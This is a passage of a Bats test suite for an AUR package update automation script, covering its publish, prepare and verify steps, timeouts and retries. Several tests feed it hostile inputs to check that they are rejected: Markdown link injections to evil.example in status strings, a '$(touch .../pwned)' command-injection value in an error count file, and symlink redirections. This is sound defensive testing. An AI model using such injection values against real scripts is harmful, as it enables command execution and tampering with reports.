# Usage: checked_status <package> <status>
checked_status() {
  printf '%s\n' "$2" >"$TEST_TMPDIR/.status/$1"
}

@test "check-all --publish: publishes the version the check run found, runs no strategy and keeps the checked statuses" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "other" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "new_version: 2.0.0"
  checked_status other "up_to_date"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script check-update.sh 1 "strategy ran"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/check-update.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/publish-pkg.sh.args")" = "pkg 2.0.0 $TEST_TMPDIR/out/prepared/pkg" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "updated: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/other")" = "up_to_date" ]
}

@test "check-all --publish: keeps a failed check" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "check_failed: API down"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: API down" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "1" ]
}

@test "check-all --publish: keeps a skipped downgrade and publishes nothing" {
  create_test_package "older" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status older "downgrade_skipped: 0.9.0"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/older")" = "downgrade_skipped: 0.9.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
}

@test "check-all --publish: publishes no downgrade of a package that does not allow it" {
  create_test_package "older" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status older "available_downgrade: 0.9.0"
  mkdir -p "$TEST_TMPDIR/out/prepared/older"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/older")" = "downgrade_skipped: 0.9.0" ]
}

@test "check-all --publish: keeps a skipped version jump and publishes nothing" {
  create_test_package "jumpy" "github-release" "upstream:
  project: owner/repo
current: '13'"
  checked_status jumpy "jump_skipped: 2026102100"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/jumpy")" = "jump_skipped: 2026102100" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
}

@test "check-all --publish: publishes no version jump of a package that does not allow it" {
  create_test_package "jumpy" "github-release" "upstream:
  project: owner/repo
current: '13'"
  checked_status jumpy "new_version: 2026102100"
  mkdir -p "$TEST_TMPDIR/out/prepared/jumpy"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/jumpy")" = "jump_skipped: 2026102100" ]
}

@test "check-all --prepare and --publish: carry the aurtomator release status of the check run" {
  echo "0.6.0" >"$TEST_TMPDIR/VERSION"
  echo "newer: 0.7.0" >"$TEST_TMPDIR/.status/_upstream"
  MOCK_UPSTREAM_TAG=fail run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/.status/_upstream")" = "newer: 0.7.0" ]
  MOCK_UPSTREAM_TAG=fail run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/.status/_upstream")" = "newer: 0.7.0" ]
}

@test "check-all --publish: drops an aurtomator release status it does not know" {
  local upstream
  for upstream in "newer: 0.7" "later: 0.7.0" "newer: 0.7.0 x" "x newer: 0.7.0"; do
    printf '%s\n' "$upstream" >"$TEST_TMPDIR/.status/_upstream"
    run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
    [ "$status" -eq 0 ]
    [ ! -e "$TEST_TMPDIR/.status/_upstream" ] || {
      echo "kept: $upstream"
      return 1
    }
  done
}

@test "check-all --publish: keeps a held update and publishes nothing" {
  create_test_package "held" "github-release" "upstream:
  project: owner/repo
current: 28+25"
  checked_status held "held: 29+1"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/held")" = "held: 29+1" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
}

@test "check-all --publish: keeps a held update and records the notes of its alerts again" {
  create_test_package "held" "github-release" "upstream:
  project: owner/repo
current: 28+25
alerts:
  - when: major
    note: Create the package for the old major
  - from: '29'
    hold: true
    note: Raise makedepends java-environment to 28"
  checked_status held "held: 29+1"
  printf 'held\thold\tstale note\n' >"$TEST_TMPDIR/.status/_alerts"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/held")" = "held: 29+1" ]
  [ "$(cat "$TEST_TMPDIR/.status/_alerts")" = $'held\tnotice\tCreate the package for the old major\nheld\thold\tRaise makedepends java-environment to 28' ]
}

@test "check-all --publish: publishes no update an alert with hold: true fires on" {
  create_test_package "held" "github-release" "upstream:
  project: owner/repo
current: 28+25
alerts:
  - when: major
    hold: true
    note: Raise makedepends java-environment to 28"
  checked_status held "new_version: 29+1"
  mkdir -p "$TEST_TMPDIR/out/prepared/held"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/held")" = "held: 29+1" ]
}

@test "check-all --publish: publishes an update an alert without hold fires on" {
  create_test_package "noted" "github-release" "upstream:
  project: owner/repo
current: 28+25
alerts:
  - when: major
    note: Create the package for the old major"
  checked_status noted "new_version: 29+1"
  mkdir -p "$TEST_TMPDIR/out/prepared/noted"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/publish-pkg.sh.args")" = "noted 29+1 $TEST_TMPDIR/out/prepared/noted" ]
  [ "$(cat "$TEST_TMPDIR/.status/noted")" = "updated: 29+1" ]
  [ "$(cat "$TEST_TMPDIR/.status/_alerts")" = $'noted\tnotice\tCreate the package for the old major' ]
}

@test "check-all --publish: marks a package the check run left out" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: not checked before --publish" ]
}

@test "check-all --publish: replaces a checked status the check run does not write" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "update_failed: stale"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: invalid status from the check run" ]
}

@test "check-all --publish: replaces a checked status with an unsafe version" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 1.0](https://evil.example)"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: invalid status from the check run" ]
}

@test "check-all --publish: replaces a checked status with extra lines" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg $'new_version: 2.0.0\n| [x](https://evil.example) |'
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: invalid status from the check run" ]
}

@test "check-all --publish: publishes only packages the check run found outdated" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "up_to_date"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "up_to_date" ]
}

@test "check-all --publish: records an outdated package without an update as failed" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: prepare and verify handed over no update" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "1" ]
}

@test "check-all --publish: keeps the update failure the prepare run recorded" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/out/status"
  printf 'update_failed: audit failed\nline two\n' >"$TEST_TMPDIR/out/status/pkg"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = $'update_failed: audit failed\nline two' ]
}

@test "check-all --publish: takes no other status from the prepare run" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "other" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "new_version: 2.0.0"
  checked_status other "up_to_date"
  mkdir -p "$TEST_TMPDIR/out/status"
  echo "up_to_date" >"$TEST_TMPDIR/out/status/pkg"
  echo "check_failed: forged" >"$TEST_TMPDIR/out/status/other"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: prepare and verify handed over no update" ]
  [ "$(cat "$TEST_TMPDIR/.status/other")" = "up_to_date" ]
}

@test "check-all --publish: leaves a deferred package as available, without an error" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 3
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "new_version: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
}

@test "check-all --publish: records a refused publish" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 1 "changes lines outside pkgver"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: changes lines outside pkgver" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "1" ]
}

@test "check-all --publish: ignores prepared directories of unknown packages" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "up_to_date"
  mkdir -p "$TEST_TMPDIR/out/prepared/evil"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -f "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ ! -f "$TEST_TMPDIR/.status/evil" ]
}

@test "check-all --publish: ignores a prepared directory that is a symlink" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/elsewhere/pkg" "$TEST_TMPDIR/out"
  ln -s "$TEST_TMPDIR/elsewhere" "$TEST_TMPDIR/out/prepared"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -f "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: prepare and verify handed over no update" ]
}

@test "check-all --publish: does not import statuses of names that are not packages" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  checked_status pkg "up_to_date"
  mkdir -p "$TEST_TMPDIR/out/status"
  echo "update_failed: spoofed" >"$TEST_TMPDIR/out/status/evil"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -e "$TEST_TMPDIR/.status/evil" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "up_to_date" ]
}

@test "check-all --publish: does not read a handed over status directory that is a symlink" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/elsewhere" "$TEST_TMPDIR/out"
  echo "update_failed: from elsewhere" >"$TEST_TMPDIR/elsewhere/pkg"
  ln -s "$TEST_TMPDIR/elsewhere" "$TEST_TMPDIR/out/status"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: prepare and verify handed over no update" ]
}

@test "check-all --publish: does not follow symlinks among the handed over statuses" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "other" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  checked_status other "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg" "$TEST_TMPDIR/out/status"
  echo "update_failed: from a link" >"$TEST_TMPDIR/target-status"
  echo "keep" >"$TEST_TMPDIR/target-count"
  ln -s "$TEST_TMPDIR/target-status" "$TEST_TMPDIR/out/status/pkg"
  ln -s "$TEST_TMPDIR/target-status" "$TEST_TMPDIR/out/status/other"
  ln -s "$TEST_TMPDIR/target-count" "$TEST_TMPDIR/out/status/_error_count"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$(cat "$TEST_TMPDIR/target-status")" = "update_failed: from a link" ]
  [ "$(cat "$TEST_TMPDIR/target-count")" = "keep" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "updated: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/other")" = "update_failed: prepare and verify handed over no update" ]
}

@test "check-all --publish: does not read a checked status that is a symlink" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  echo "new_version: 2.0.0" >"$TEST_TMPDIR/target-status"
  ln -s "$TEST_TMPDIR/target-status" "$TEST_TMPDIR/.status/pkg"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -e "$TEST_TMPDIR/publish-pkg.sh.args" ]
  [ ! -L "$TEST_TMPDIR/.status/pkg" ]
  [ "$(cat "$TEST_TMPDIR/target-status")" = "new_version: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: not checked before --publish" ]
}

@test "check-all --publish: replaces a status directory that is a symlink" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '2.0.0'"
  rm -rf "$TEST_TMPDIR/.status"
  mkdir -p "$TEST_TMPDIR/elsewhere"
  ln -s "$TEST_TMPDIR/elsewhere" "$TEST_TMPDIR/.status"
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -L "$TEST_TMPDIR/.status" ]
  [ -d "$TEST_TMPDIR/.status" ]
  [ -z "$(ls -A "$TEST_TMPDIR/elsewhere")" ]
}

@test "check-all --publish: counts the errors itself" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "broken" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  checked_status broken "check_failed: API down"
  echo 7 >"$TEST_TMPDIR/.status/_error_count"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg" "$TEST_TMPDIR/out/status"
  echo 'a[$(touch '"$TEST_TMPDIR"'/pwned)]' >"$TEST_TMPDIR/out/status/_error_count"
  stub_script publish-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ ! -f "$TEST_TMPDIR/pwned" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "1" ]
}

# === check-all.sh time budgets ===

# Helper: replace a script with a stub that starts a background sleep,
# records its pid in $TEST_TMPDIR/<script>.child, and then hangs
# Usage: hanging_script <script name>
hanging_script() {
  rm -f "$TEST_TMPDIR/scripts/$1"
  cat >"$TEST_TMPDIR/scripts/$1" <<EOF
#!/usr/bin/env bash
sleep 60 &
echo \$! >"$TEST_TMPDIR/$1.child"
sleep 60
EOF
  chmod +x "$TEST_TMPDIR/scripts/$1"
}

# Succeeds when the child that hanging_script started has ended. In a job
# container pid 1 never reaps an orphan, so an ended child can stay a zombie.
child_ended() {
  local state
  state=$(ps -o stat= -p "$(cat "$TEST_TMPDIR/$1.child")") || return 0
  [[ "$state" == Z* ]]
}

@test "check-all: a strategy that hangs fails after its time budget and the others go on" {
  create_test_package "slow" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "zzz" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  rm -f "$TEST_TMPDIR/scripts/check-update.sh"
  cat >"$TEST_TMPDIR/scripts/check-update.sh" <<EOF
#!/usr/bin/env bash
[[ "\$1" == "slow" ]] && exec "$TEST_TMPDIR/scripts/hang.sh"
exit 0
EOF
  chmod +x "$TEST_TMPDIR/scripts/check-update.sh"
  hanging_script hang.sh
  SECONDS=0
  AURTOMATOR_CHECK_TIMEOUT=1 run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$SECONDS" -lt 10 ]
  [ "$(cat "$TEST_TMPDIR/.status/slow")" = "check_failed: timed out after 1 s" ]
  [ "$(cat "$TEST_TMPDIR/.status/zzz")" = "up_to_date" ]
  child_ended hang.sh
}

@test "check-all: an asset lookup that hangs fails after the budget of a check and gets no second pass" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
  asset_regex: '^pkg_(.+)\\.tar\\.gz\$'
  asset_var: _pkg
current: '1.0.0'"
  hanging_script check-asset.sh
  SECONDS=0
  AURTOMATOR_CHECK_TIMEOUT=1 run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$SECONDS" -lt 10 ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "check_failed: timed out after 1 s" ]
  [[ "$output" != *"again"* ]]
  child_ended check-asset.sh
}

@test "check-all --prepare: an update that hangs fails after its time budget" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  hanging_script update-pkg.sh
  SECONDS=0
  AURTOMATOR_UPDATE_TIMEOUT=1 run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$SECONDS" -lt 10 ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "update_failed: timed out after 1 s" ]
  child_ended update-pkg.sh
}

@test "check-all --verify: a verify that hangs fails after its time budget" {
  setup_check_verify
  hanging_script verify-pkg.sh
  SECONDS=0
  AURTOMATOR_UPDATE_TIMEOUT=1 run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$SECONDS" -lt 10 ]
  [ ! -e "$TEST_TMPDIR/out/prepared/pkg" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "update_failed: timed out after 1 s" ]
  child_ended verify-pkg.sh
}

@test "check-all --publish: a publish that hangs fails after its time budget" {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  checked_status pkg "new_version: 2.0.0"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg"
  hanging_script publish-pkg.sh
  SECONDS=0
  AURTOMATOR_UPDATE_TIMEOUT=1 run "$TEST_TMPDIR/scripts/check-all.sh" --publish "$TEST_TMPDIR/out"
  [ "$SECONDS" -lt 10 ]
  [ "$(cat "$TEST_TMPDIR/.status/pkg")" = "update_failed: timed out after 1 s" ]
  child_ended publish-pkg.sh
}

# === check-all.sh second pass ===

# Helper: a check-update.sh that logs every package it checks to
# $TEST_TMPDIR/checks, exits for <package> with the given codes, one per
# call, and finds every package up to date otherwise; a sleep that logs its
# argument to $TEST_TMPDIR/sleeps; the packages flaky and steady
# Usage: flaky_check <package> [exit code]...
flaky_check() {
  local pkg="$1"
  shift
  create_test_package "flaky" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  create_test_package "steady" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  printf '%s\n' "$@" >"$TEST_TMPDIR/codes"
  rm -f "$TEST_TMPDIR/scripts/check-update.sh"
  cat >"$TEST_TMPDIR/scripts/check-update.sh" <<EOF
#!/usr/bin/env bash
echo "\$1" >>"$TEST_TMPDIR/checks"
[[ "\$1" == "$pkg" ]] || exit 0
rc=\$(head -1 "$TEST_TMPDIR/codes")
sed -i 1d "$TEST_TMPDIR/codes"
[[ -n "\$rc" ]] || exit 0
echo "API down" >&2
exit "\$rc"
EOF
  chmod +x "$TEST_TMPDIR/scripts/check-update.sh"
  printf '#!/usr/bin/env bash\necho "$1" >>"%s/sleeps"\n' "$TEST_TMPDIR" >"$MOCK_DIR/sleep"
  chmod +x "$MOCK_DIR/sleep"
}

@test "check-all: checks a package that failed again after a pause" {
  flaky_check flaky 1
  AURTOMATOR_RECHECK_DELAY=9 run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/checks")" = $'flaky\nsteady\nflaky' ]
  [ "$(cat "$TEST_TMPDIR/sleeps")" = "9" ]
  [ "$(cat "$TEST_TMPDIR/.status/flaky")" = "up_to_date" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "0" ]
  [[ "$output" == *"Checking 1 failed package(s) again in 9 s"* ]]
  [[ "$output" == *"Checked: 2, Updated: 0, Errors: 0"* ]]
}

@test "check-all: keeps a package that fails twice as failed" {
  flaky_check flaky 1 1
  run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/checks")" = $'flaky\nsteady\nflaky' ]
  [ "$(cat "$TEST_TMPDIR/.status/flaky")" = "check_failed: API down" ]
  [ "$(cat "$TEST_TMPDIR/.status/_error_count")" = "1" ]
}

# Without network every check runs out of its budget, and a second pass
# would double the time of the job
@test "check-all: checks a package that ran out of its budget once" {
  flaky_check flaky 124
  run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/checks")" = $'flaky\nsteady' ]
  [ ! -e "$TEST_TMPDIR/sleeps" ]
  [ "$(cat "$TEST_TMPDIR/.status/flaky")" = "check_failed: timed out after 120 s" ]
}

@test "check-all: makes no pause when every check passed" {
  flaky_check flaky
  run "$TEST_TMPDIR/scripts/check-all.sh"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/checks")" = $'flaky\nsteady' ]
  [ ! -e "$TEST_TMPDIR/sleeps" ]
}

@test "check-all --update: checks a package that failed again" {
  flaky_check flaky 1
  run "$TEST_TMPDIR/scripts/check-all.sh" --update
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/checks")" = $'flaky\nsteady\nflaky' ]
  [ "$(cat "$TEST_TMPDIR/.status/flaky")" = "up_to_date" ]
}

@test "check-all --prepare: checks no failed package again" {
  flaky_check flaky
  echo "check_failed: API down" >"$TEST_TMPDIR/.status/flaky"
  echo "up_to_date" >"$TEST_TMPDIR/.status/steady"
  run "$TEST_TMPDIR/scripts/check-all.sh" --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/sleeps" ]
  [ "$(cat "$TEST_TMPDIR/out/status/flaky")" = "check_failed: API down" ]
}

# === check-all.sh --verify ===

# Helper: one package with a prepared update and its handed over status
setup_check_verify() {
  create_test_package "pkg" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  mkdir -p "$TEST_TMPDIR/out/prepared/pkg" "$TEST_TMPDIR/out/status"
  echo "new_version: 2.0.0" >"$TEST_TMPDIR/out/status/pkg"
  echo 1 >"$TEST_TMPDIR/out/status/_error_count"
}

@test "check-all --verify: keeps a verified update and runs no strategy" {
  setup_check_verify
  stub_script check-update.sh 1 "strategy ran"
  stub_script verify-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/check-update.sh.args" ]
  grep -qx "pkg $TEST_TMPDIR/out/prepared/pkg" "$TEST_TMPDIR/verify-pkg.sh.args"
  [ -d "$TEST_TMPDIR/out/prepared/pkg" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "new_version: 2.0.0" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "1" ]
}

@test "check-all --verify: takes out an update that fails, with update_failed" {
  setup_check_verify
  stub_script verify-pkg.sh 1 "checksum mismatch"
  run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/out/prepared/pkg" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "update_failed: checksum mismatch" ]
  [ "$(cat "$TEST_TMPDIR/out/status/_error_count")" = "2" ]
}

# The prepare run writes the base of every package, so a moved AUR repo and
# a wrong base look the same
@test "check-all --verify: takes out an update the AUR moved under, with update_failed" {
  setup_check_verify
  stub_script verify-pkg.sh 3 "the AUR repo moved"
  run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ ! -e "$TEST_TMPDIR/out/prepared/pkg" ]
  [ "$(cat "$TEST_TMPDIR/out/status/pkg")" = "update_failed: the AUR repo moved" ]
}

@test "check-all --verify: verifies only prepared packages from packages/" {
  setup_check_verify
  create_test_package "other" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  mkdir -p "$TEST_TMPDIR/out/prepared/unknown"
  stub_script verify-pkg.sh 0
  run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/verify-pkg.sh.args")" = "pkg $TEST_TMPDIR/out/prepared/pkg" ]
}

@test "check-all --verify: verifies the packages of AURTOMATOR_DATA_DIR" {
  mkdir -p "$BATS_TEST_TMPDIR/data/packages" "$TEST_TMPDIR/out/prepared/pkg"
  printf '%s\n' 'name: pkg' 'strategy: github-release' 'upstream:' '  project: owner/repo' "current: '1.0.0'" >"$BATS_TEST_TMPDIR/data/packages/pkg.yml"
  stub_script verify-pkg.sh 0
  AURTOMATOR_DATA_DIR="$BATS_TEST_TMPDIR/data" run "$TEST_TMPDIR/scripts/check-all.sh" --verify "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/verify-pkg.sh.args")" = "pkg $TEST_TMPDIR/out/prepared/pkg" ]
}

# === alert_issue_body ===

@test "alert_issue_body: lists every note of a held update" {
  echo "held: 29+1" >"$TEST_TMPDIR/demo"
  printf '%s\t%s\t%s\n' demo notice "Create the package for the old major" other hold "Not this one" \
    demo hold "Raise makedepends java-environment to 28" >"$TEST_TMPDIR/_alerts"
  run alert_issue_body "$TEST_TMPDIR/demo" https://github.com/owner/repo/actions/runs/1
  [ "$status" -eq 0 ]
  expected=$(
    cat <<'EOF'
Package: `demo`
Held version: `29+1`
Run: https://github.com/owner/repo/actions/runs/1

- Create the package for the old major
- Raise makedepends java-environment to 28

